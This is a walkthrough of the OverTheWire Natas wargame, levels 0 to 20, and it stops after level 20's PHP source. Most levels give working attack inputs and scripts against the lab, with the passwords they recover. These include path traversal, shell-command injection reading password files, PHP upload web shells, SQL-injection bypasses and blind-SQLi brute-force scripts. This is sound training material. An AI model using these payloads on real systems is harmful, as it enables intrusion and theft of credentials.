---
title: "[OTW] Разбор варгейма Natas"
permalink: /writeups/otw/natas/
excerpt: "Краткий разбор варгейма Natas с OverTheWire."
---

---
{% include toc icon="cog" title="Natas Wargame" %}
The [Natas](http://overthewire.org/wargames/natas/) wargame is an online game offered by the [OverTheWire](http://overthewire.org) community. This wargame is for the ones that want to learn the basics of serverside web-security. You can see the most common bugs in this game.
{: .text-justify}

Each level has access to the password of the next level. Your job is to obtain that next password and level up. All passwords are also stored in **/etc/natas_webpass/**. For example the password for **natas5** is stored in the file **/etc/natas_webpass/natas5** and only readable by *natas4* and *natas5*.
{: .text-justify}

Let's get started !

![image-center](/images/otw/crash_override.gif){: .align-center}

## Решение Natas 00

**URL :** [http://natas0.natas.labs.overthewire.org](http://natas0.natas.labs.overthewire.org) <br/>
**Credentials :** *natas0:natas0*

This one is simple, just check the source of the page :

```bash
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

## Решение Natas 01

**URL :** [http://natas1.natas.labs.overthewire.org](http://natas1.natas.labs.overthewire.org) <br/>
**Credentials :** *natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto*

In this level the right click has been blocked, but to display the source you can simply use the browser shortcut to display the code. As I'm using Chrome it's `Option+Command+U`.

```bash
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

## Решение Natas 02

**URL :** [http://natas2.natas.labs.overthewire.org](http://natas2.natas.labs.overthewire.org) <br/>
**Credentials :** *natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi*

If you check the source, you will see a link to an image file : 

```html
<img src="files/pixel.png">
```

Just remove the filename and check [http://natas2.natas.labs.overthewire.org/files/](http://natas2.natas.labs.overthewire.org/files/) to get the directory contents. You'll find the password in the **users.txt** file.

```bash
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
```

## Решение Natas 03

**URL :** [http://natas3.natas.labs.overthewire.org](http://natas3.natas.labs.overthewire.org) <br/>
**Credentials :** *natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14*

In practice, **robots.txt** files indicate whether certain user agents can or cannot crawl parts of a website. Nowadays, it exists on most of the websites.

Let's check the *robots.txt* file on this page ([http://natas3.natas.labs.overthewire.org/robots.txt](http://natas3.natas.labs.overthewire.org/robots.txt)), you'll find the folder containing the password :

```bash
User-agent: *
Disallow: /s3cr3t/
```

Browse the folder, and check the **users.txt** file.

```bash
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

## Решение Natas 04

**URL :** [http://natas4.natas.labs.overthewire.org](http://natas4.natas.labs.overthewire.org) <br/>
**Credentials :** *natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ*

When you try to login, you get the following error message:

```bash
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 
```

You can solve this one by changing the *referer* of the request with a simple Python script:

```python
import requests

url = "http://natas4.natas.labs.overthewire.org/"
referer = "http://natas5.natas.labs.overthewire.org/"

s = requests.Session()
s.auth = ('natas4', 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')
s.headers.update({'referer': referer})
r = s.get(url)

print(r.text)
```

Grab the password and go to the next level :

```text
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

## Решение Natas 05

**URL :** [http://natas5.natas.labs.overthewire.org](http://natas5.natas.labs.overthewire.org) <br/>
**Credentials :** *natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq*

When we try to login, we get the following error message :

```text
Access disallowed. You are not logged in
```

Let's check the headers of the HTTP response with Python :

```python
import requests

url = "http://natas5.natas.labs.overthewire.org/"
s = requests.Session()
s.auth = ('natas5', 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq')
r = s.get(url)

print(r.headers)
```

Here is the response :

```text
{'Date': 'Fri, 29 Mar 2019 20:18:20 GMT', 'Server': 'Apache/2.4.10 (Debian)', 'Set-Cookie': 'loggedin=0', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '367', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
```

As we can see we got a cookie **'Set-Cookie': 'loggedin=0'**. We can try to modify it with the value **1** and refresh the page. This can be done directly in **Chrome** by using the *Javascript Console*.
![image-center](/images/otw/edit_cookie.png){: .align-center}
Done !

```text
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

## Решение Natas 06

**URL :** [http://natas6.natas.labs.overthewire.org](http://natas6.natas.labs.overthewire.org) <br/>
**Credentials :** *natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1*

In this level, we need to enter a *secret* to get the solution. If we check the source, we obtain the following PHP code :

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

By reading the code you can see that there is an included file (`include "includes/secret.inc";`), let's try to access it :

```php
// http://natas6.natas.labs.overthewire.org/includes/secret.inc
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Now, if you enter the secret, you'll be able to get the password for the following level :

```text
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

## Решение Natas 07

**URL :** [http://natas7.natas.labs.overthewire.org](http://natas7.natas.labs.overthewire.org) <br/>
**Credentials :** *natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9*

In this level, we get 2 links to random pages. If you check the URL, you can see that the *index.php* takes the page name as variable.
![image-center](/images/otw/natas7_home.png){: .align-center}

```text
http://natas7.natas.labs.overthewire.org/index.php?page=home
```

We know that the password for **natas8** should be in **/etc/natas_webpass/natas8** so, we could try a path traversal to find the password :

```text
http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../../../etc/natas_webpass/natas8
```

And here we go !

```text
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```

## Решение Natas 08

**URL :** [http://natas8.natas.labs.overthewire.org](http://natas8.natas.labs.overthewire.org) <br/>
**Credentials :** *natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe*

In this level, we have the following PHP code :

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

Here, your input should be equal to **3d3d516343746d4d6d6c315669563362**, but it is modified by the *encodeSecret()* function. 

We just need to reverse it to obtain the right secret. Here is the Python script :

```python
import base64

secret = "3d3d516343746d4d6d6c315669563362"
secret = bytes.fromhex(secret)
secret = secret[::-1]
secret = base64.decodebytes(secret)

print(secret)

# Result = oubWYf2kBq
```

Now, if you enter the secret you should get the password for the next level :

```text
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

## Решение Natas 09

**URL :** [http://natas9.natas.labs.overthewire.org](http://natas9.natas.labs.overthewire.org) <br/>
**Credentials :** *natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl*

In this level, we got the following PHP code :

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

By reading the code, we can tell that there is a potential command injection. 

So if we enter `; cat /etc/natas_webpass/natas10` in the search field, we will get the password. That's due to the fact that the `;` token separates commands in a shell.

```text
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

## Решение Natas 10

**URL :** [http://natas10.natas.labs.overthewire.org](http://natas10.natas.labs.overthewire.org) <br/>
**Credentials :** *natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu*

In this level, we got the following PHP code :

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

This one is quite similar to the previous one however, we got some restriction on the characters. But, we could try to read all the files of a directory using the following input : `.* /etc/natas_webpass/natas11`

```text
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

## Решение Natas 11

**URL :** [http://natas11.natas.labs.overthewire.org](http://natas11.natas.labs.overthewire.org) <br/>
**Credentials :** *natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK*

In this level, we got the following PHP code :

```php
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

?>


<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```

In this challenge, the code seems to add the color of the background into our cookie. Also, the cookie contains the field *showpassword* set to **no**. If we modify the value to **yes** we'll get the value of the password. However, we don't have the key for the *xor_encrypt()* function.

Luckily, as the algorithm used is **XOR** and we know the plaintext and ciphertext values of the cookie we can recover the key. This is due to the fact that `ciphertext XOR plaintext = key`, it's called known-plaintext attack. Let's write a quick Python script to get the secret key.

```python
import base64
import json

ciphertext = b"ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw="
ciphertext = base64.decodebytes(ciphertext)
plaintext = {"showpassword":"no", "bgcolor":"#ffffff"}
# Here, we remove the space as JSON implementation in Python is different from PHP
plaintext = json.dumps(plaintext).encode('utf-8').replace(b" ", b"")

def xor_decrypt(plaintext, ciphertext):
    secret = ""

    for x in range(len(plaintext)):
        secret += str(chr(ciphertext[x] ^ plaintext[x % len(plaintext)]))

    return secret

secret = xor_decrypt(ciphertext, plaintext)
print(secret)

# Result = qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```

Okay, now we need to encode the new cookie with **yes** as value for *showpassword*.

```python
import base64
import json

# Here we added a "w" at the end because the cookie is 
# 1 byte longer as "yes" is 3 bytes and "no" 2 bytes
# Why a "w" ? it is just due to the pattern of the key
key = b"qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw"
new_cookie = {"showpassword":"yes", "bgcolor":"#ffffff"}
new_cookie = json.dumps(new_cookie).encode('utf-8').replace(b" ", b"")

def xor_encrypt(key, cookie):
    data = ""
    for x in range(len(key)):
        data += str(chr(cookie[x] ^ key[x % len(key)]))

    data = base64.encodebytes(data.encode('utf-8'))
    return data

data = xor_encrypt(key, new_cookie)
print(data)

# Result = ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```

Now we just need to edit our cookie in the browser using the Javascript console :

```javascript
document.cookie="data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"
```

Done !

```text
The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```

## Решение Natas 12

**URL :** [http://natas12.natas.labs.overthewire.org](http://natas12.natas.labs.overthewire.org) <br/>
**Credentials :** *natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3*

In this level, we got the following PHP code :

```php
<?  

function genRandomString() { 
    $length = 10; 
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
    $string = "";     

    for ($p = 0; $p < $length; $p++) { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 

    return $string; 
} 

function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 

if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
} else { 
?> 
```

Here, it is a simple file upload vulnerability. If we upload a simple PHP file like :

```php
<?php
echo system("cat /etc/natas_webpass/natas13");
?>
```

We should be able to get the password for the next level. However, if you take a look at the HTML code :

```html
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" /> 
```

The extension of the file if modified on the client side. If we want to keep the ".php" extension, we need to intercept the upload request and modify the extension to *.php*, it can be done using a proxy like *Burp*
![image-center](/images/otw/file_upload_01_burp.png){: .align-center}
Then, you can browse the link returned by the server and get the password :
![image-center](/images/otw/file_upload_01_chrome.png){: .align-center}
Here you go ...

```text
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

## Решение Natas 13

**URL :** [http://natas13.natas.labs.overthewire.org](http://natas13.natas.labs.overthewire.org) <br/>
**Credentials :** *natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY*

Here is the source code for this challenge :

```php
<?  
function genRandomString() { 
    $length = 10; 
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
    $string = "";     

    for ($p = 0; $p < $length; $p++) { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 

    return $string; 
} 

function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 

if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 
     
    $err=$_FILES['uploadedfile']['error']; 
    if($err){ 
        if($err === 2){ 
            echo "The uploaded file exceeds MAX_FILE_SIZE"; 
        } else{ 
            echo "Something went wrong :/"; 
        } 
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 
        echo "File is not an image"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
} else { 
?> 
```

This one is similar to the previous one, however this time the developer check if the file is an image file. We can try to bypass it by using the magic number of a bitmap file, **BMP**, and prepend it to our PHP code  :

```php
BMP<? 
echo system("cat /etc/natas_webpass/natas14"); 
?>
```

Then we use the same trick as before to modify the file extension in **Burp**.
![image-center](/images/otw/file_upload_02_burp.png){: .align-center}
Then, you can browse the link returned by the server and get the password :
![image-center](/images/otw/file_upload_02_chrome.png){: .align-center}
Here is the password :

```text
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```

## Решение Natas 14

**URL :** [http://natas14.natas.labs.overthewire.org](http://natas14.natas.labs.overthewire.org) <br/>
**Credentials :** *natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1*

Here is the PHP code for this challenge :

```php
<? 
if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas14', '<censored>'); 
    mysql_select_db('natas14', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    if(mysql_num_rows(mysql_query($query, $link)) > 0) { 
            echo "Successful login! The password for natas15 is <censored><br>"; 
    } else { 
            echo "Access denied!<br>"; 
    } 
    mysql_close($link); 
} else { 
?> 
```

Here we got an SQL Injection, if you check the query you can see that we can easly bypass the authentication :

```sql
SELECT * from users where username="user" and password="pass"
```

If we put **" OR 1=1#** into the username field, you can see that we succesfully take over the logic of the query and force it to return *true* (the **#** will make sure that remaining of the query will be passed as comment) :


```sql
SELECT * from users where username="user" OR 1=1# " and password="pass"
```

Congrats, you solved the challenge.

```text
Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

## Решение Natas 15

**URL :** [http://natas15.natas.labs.overthewire.org](http://natas15.natas.labs.overthewire.org) <br/>
**Credentials :** *natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J*

Here is the PHP code for this challenge :

```php
<? 

/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas15', '<censored>'); 
    mysql_select_db('natas15', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        echo "This user exists.<br>"; 
    } else { 
        echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
} else { 
?> 
```

This one looks tricky because the only answers we'll get from this page are :
- "This user doesn't exist"
- "This user exists". 

However, there is an SQL injection in the **username** field, but it's a blind one. We only get true/false answers. We just nee to find a way to forge a query that will answer to questions like *"Does the password for natas16 starts with 'a' ?"* and get the results.

Here is my solution :

```sql
-- Original request
SELECT * from users where username=""

-- SQLi ('x' is a variable)
SELECT * from users where username="natas16" and password like binary "x%"
```

Here we just check the **natas16** username as it exists in the database and add some statements by passing a double-quote after the username. 

The statements `LIKE BINARY "x%"` means that we want to check if the password start with **x** and we make that query case sensitive by using the **BINARY** statement. 

Now, if it does start with "x", we'll get a "This user exists" in the page, if it doesn't we'll get a "This user doesn't exist". Easy, right ?

Now, as it will take forever to do that manually, we'll need a script !

```python
import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase

url = "http://natas15.natas.labs.overthewire.org/"
charset = ascii_lowercase + ascii_uppercase + digits
sqli = 'natas16" AND password LIKE BINARY "'

s = requests.Session()
s.auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

password = ""
# We assume that the password is 32 chars 
while len(password) < 32:
    for char in charset:
        r = s.post('http://natas15.natas.labs.overthewire.org/', data={'username':sqli + password + char + "%"})
        if "This user exists" in r.text:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break
```

Grab a coffee while the script is running and when you get back you should have your answer...

```text
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

## Решение Natas 16

**URL :** [http://natas16.natas.labs.overthewire.org](http://natas16.natas.labs.overthewire.org) <br/>
**Credentials :** *natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh*

Here is the PHP code for this challenge :

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Here, we have a search field used to find words containing a pattern we can specify. We also have a filter on certain characters. However, we still can inject command. The `$`, `(`, `)` are not filtered so we can use **$()** as command substitution. 

Still, I discoverd that we could not directly read the file with the command substitution but, we could have boolean answer from the script! We just need to solve it the same way we did with the previous blind SQL Injection.

Here is how it works :

- If you submit a random letter in the search field you'll get a result
- If you submit an empty field you get nothing

So, if you inject `$(grep -E ^x.* /etc/natas_webpass/natas17)`:

- No results = **True** (the password starts with **x**)
- Results = **False** (the password does note starts with **x**)

I wrote a simple Python scripts to solve this one. I used the page size as an indicator of true/false.

```python
import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase

charset = ascii_lowercase + ascii_uppercase + digits
s = requests.Session()
s.auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

password = ""
# We assume that the password is 32 chars 
while len(password) < 32:
    for char in charset:
        payload = {'needle': '$(grep -E ^%s.* /etc/natas_webpass/natas17)' % (password + char)}
        r = s.get('http://natas16.natas.labs.overthewire.org/index.php', params=payload)

        if len(r.text) == 1105:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break
```

Wait a few seconds and you should get an answer.

```text
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

## Решение Natas 17

**URL :** [http://natas17.natas.labs.overthewire.org](http://natas17.natas.labs.overthewire.org) <br/>
**Credentials :** *natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw*

Here is the PHP code for this challenge :

```php
<? 

/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        //echo "This user exists.<br>"; 
    } else { 
        //echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        //echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
} else { 
?> 
```

Ah ! Another SQL Injection and this one does not return anything ! We will use the same technique used with the previous SQLi Blind however, this time we will use *time* as an indicator of true/false.

I just modified the script to append the `SLEEP` statement in the injection. Now, if the query timeout, it means it's **true**.

```python
import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase

charset = ascii_lowercase + ascii_uppercase + digits
sqli_1 = 'natas18" AND password LIKE BINARY "'
sqli_2 = '" AND SLEEP(5)-- '

s = requests.Session()
s.auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

password = ""
# We assume that the password is 32 chars 
while len(password) < 32:
    for char in charset:
        try:
            payload = {'username':sqli_1 + password + char + "%" + sqli_2}
            r = s.post('http://natas17.natas.labs.overthewire.org/', data=payload, timeout=1)
        except requests.Timeout:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break

```

Again, wait a few seconds and get the password :

```text
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```

## Решение Natas 18

**URL :** [http://natas18.natas.labs.overthewire.org](http://natas18.natas.labs.overthewire.org) <br/>
**Credentials :** *natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP*

Here is the PHP code for this challenge :

```php
<? 

$maxid = 640; // 640 should be enough for everyone 

function isValidAdminLogin() { 
    if($_REQUEST["username"] == "admin") { 
    /* This method of authentication appears to be unsafe and has been disabled for now. */ 
        //return 1; 
    } 

    return 0; 
} 

function isValidID($id) {  
    return is_numeric($id); 
} 

function createID($user) { 
    global $maxid; 
    return rand(1, $maxid); 
} 

function debug($msg) {
    if(array_key_exists("debug", $_GET)) { 
        print "DEBUG: $msg<br>"; 
    } 
} 

function my_session_start() {
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) { 
    if(!session_start()) { 
        debug("Session start failed"); 
        return false; 
    } else { 
        debug("Session start ok"); 
        if(!array_key_exists("admin", $_SESSION)) { 
        debug("Session was old: admin flag set"); 
        $_SESSION["admin"] = 0; // backwards compatible, secure 
        } 
        return true; 
    } 
    } 

    return false; 
} 

function print_credentials() { 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas19\n"; 
    print "Password: <censored></pre>"; 
    } else { 
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."; 
    } 
} 

$showform = true; 
if(my_session_start()) { 
    print_credentials(); 
    $showform = false; 
} else { 
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) { 
    session_id(createID($_REQUEST["username"])); 
    session_start(); 
    $_SESSION["admin"] = isValidAdminLogin(); 
    debug("New session started"); 
    $showform = false; 
    print_credentials(); 
    } 
}  

if($showform) { 
?> 
```

The code looks complex but it's not. Basically, we just need to bruteforce the **PHPSESSID** of the admin which is a value between 0 and 640 (`$maxid`). So, here is a quick script to do that !

```python
import requests

url = "http://natas18.natas.labs.overthewire.org"
url2 = "http://natas18.natas.labs.overthewire.org/index.php"

s = requests.Session()
s.auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
r = s.get(url)

for x in range(640):
    cookies = dict(PHPSESSID=str(x))
    r = s.get(url2, cookies=cookies)
    if "Login as an admin to retrieve" in r.text:
        pass
    else:
        print(r.text)
        break
```

Here is the result :
```text
4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
```

## Решение Natas 19

**URL :** [http://natas19.natas.labs.overthewire.org](http://natas19.natas.labs.overthewire.org) <br/>
**Credentials :** *natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs*

Here, we don't have the source code but the challeng says : *"This page uses mostly the same code as the previous level, but session IDs are no longer sequential..."*. Let's take a look at our cookie :

```text
Cookie: PHPSESSID=3235352d61646d696e
```

Hum... It looks like ASCII, let's decode it :

```text
255-admin
```

As per the challenge instruction, I just slightly modified my previous code to match the new cookie format :

```python
import requests
import binascii

url = "http://natas19.natas.labs.overthewire.org"

s = requests.Session()
s.auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

for x in range(1000):
    tmp = str(x) + "-admin"
    val = binascii.hexlify(tmp.encode('utf-8'))

    cookies = dict(PHPSESSID=val.decode('ascii'))
    r = s.get(url, cookies=cookies)
    if "Login as an admin to retrieve" in r.text:
        pass
    else:
        print(r.text)
        break
```

Run the script and get the result :

```text
eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
```

## Решение Natas 20

**URL :** [http://natas20.natas.labs.overthewire.org](http://natas20.natas.labs.overthewire.org) <br/>
**Credentials :** *natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF*

Here is the PHP code for this challenge :

```php
<? 

function debug($msg) {
    if(array_key_exists("debug", $_GET)) { 
        print "DEBUG: $msg<br>"; 
    } 
} 

function print_credentials() { 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas21\n"; 
    print "Password: <censored></pre>"; 
    } else { 
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21."; 
    } 
}
/* we don't need this */ 
function myopen($path, $name) {  
    //debug("MYOPEN $path $name");  
    return true;  
} 
/* we don't need this */ 
function myclose() {  
    //debug("MYCLOSE");  
    return true;  
} 

function myread($sid) {  
    debug("MYREAD $sid");  
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) { 
    debug("Invalid SID");  
        return ""; 
    } 
    $filename = session_save_path() . "/" . "mysess_" . $sid; 
    if(!file_exists($filename)) { 
        debug("Session file doesn't exist"); 
        return ""; 
    } 
    debug("Reading from ". $filename); 
    $data = file_get_contents($filename); 
    $_SESSION = array(); 
    foreach(explode("\n", $data) as $line) { 
        debug("Read [$line]"); 
    $parts = explode(" ", $line, 2); 
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1]; 
    } 
    return session_encode(); 
} 

function mywrite($sid, $data) {  
    // $data contains the serialized version of $_SESSION 
    // but our encoding is better 
    debug("MYWRITE $sid $data");  
    // make sure the sid is alnum only!! 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) { 
    debug("Invalid SID");  
        return; 
    } 
    $filename = session_save_path() . "/" . "mysess_" . $sid; 
    $data = ""; 
    debug("Saving in ". $filename); 
    ksort($_SESSION); 
    foreach($_SESSION as $key => $value) { 
        debug("$key => $value"); 
        $data .= "$key $value\n"; 
    } 
    file_put_contents($filename, $data); 
    chmod($filename, 0600); 
} 

/* we don't need this */ 
function mydestroy($sid) { 
    //debug("MYDESTROY $sid");  
    return true;  
} 
/* we don't need this */ 
function mygarbage($t) {  
    //debug("MYGARBAGE $t");  
    return true;  
} 

session_set_save_handler( 
    "myopen",  
    "myclose",  
    "myread",  
    "mywrite",  
    "mydestroy",  
    "mygarbage"); 
session_start(); 

if(array_key_exists("name", $_REQUEST)) { 
    $_SESSION["name"] = $_REQUEST["name"]; 
    debug("Name set to " . $_REQUEST["name"]); 
} 

